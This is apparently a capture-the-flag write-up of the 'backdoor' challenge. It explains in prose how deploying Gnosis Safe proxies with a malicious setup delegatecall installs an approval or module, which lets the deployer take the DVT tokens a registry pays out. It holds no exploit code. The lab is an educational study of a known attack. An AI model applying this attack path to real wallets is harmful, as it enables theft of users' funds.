### Challenge:
Our tenth challenge is called 'backdoor' and it comes with the following prompt:

```
To incentivize the creation of more secure wallets in their team, someone has deployed a registry of Gnosis Safe wallets. When someone in the team deploys and registers a wallet, they will earn 10 DVT tokens.

To make sure everything is safe and sound, the registry tightly integrates with the legitimate Gnosis Safe Proxy Factory, and has some additional safety checks.

Currently there are four people registered as beneficiaries: Alice, Bob, Charlie and David. The registry has 40 DVT tokens in balance to be distributed among them.

Your goal is to take all funds from the registry. In a single transaction.
```

We have to find a way to take the funds that are supposed to go to Alice, Bob, Charlie and David.

The contract for this challenge is located in contracts/backdoor/. The contract source code can be found below:

This one was, in my opinion, significantly more difficult than the previous levels. It required uncovering a known exploitable issue with legitimate GnosisSafe deployments. Additionally, debugging was not a pleasant experience due to the lack of error messages for reverts that occurred when a new GnosisSafe proxy was created. It took far longer to chef up the attacking contract than it did to figure out what the actual problem was. 

After reading the contract, I didn't see an obvious vulnerability. I began to do some background research on Gnosis multisig wallets, and at one point I came across this OpenZeppelin blog post: https://blog.openzeppelin.com/backdooring-gnosis-safe-multisig-wallets/. I highly recommend reading this post if you haven't already. It contains all of the info needed to figure out how to pass this level. Essentially, the issue arises because of two unique design choices:
1. Gnosis safe multisigs allow for the creation of 'modules' which are actions that can be executed without the consent of the individual signers (effectively bypassing the multisig requirements).
2. During Gnosis safe multisig proxy creation, the deployer is able to pass in arbitrary data to a delegatecall within the multisig contract.

By combining these two, we can see that it is possible for a deployer to set up a module in the newly deployed Gnosis safe multisig that can then be executed without the owner's permission. Tying this back to the challenge, it becomes clear that the registry pays out the proxy for newly created Gnosis safe multisigs as long as the owner of the multisig is part of the registry. If the deployer is using the legitimate singleton address and factory for deployment, they can be anybody. Since we can be the deployer and the deployer has the ability to exploit the two issues stated above, we can 'backdoor' these wallets by setting up a module during deployment.

The full attack path looks like this:
1. Create a data payload that will call the setup function on the newly created Gnosis safe multisig. We will pass into this both our malicious contract's address and the encoded data for any function of our choice (remember, this function on our contract will be delegate called by the newly created multisig).
2. Call `createProxyWithCallback` with the singleton address, our data payload, a random nonce, and the registry so that it can process the callback.
3. During creation of the new multisig, the proxy will call the `setup()` function for the new multisig which will in turn make a delegatecall to our contract and call our module (which simply executes an approval to spend DVTs using the multisig as the msg.sender).
4. The deployment will complete and pass all of the necessary checks (its owner will truly be either Alice, Bob, Charlie or David). Payment from the registry will be sent to the multisig.
5. In the same transaction, we will abuse our approval form the module to call `transferFrom()` and take the DVTs that were sent to the multisigs
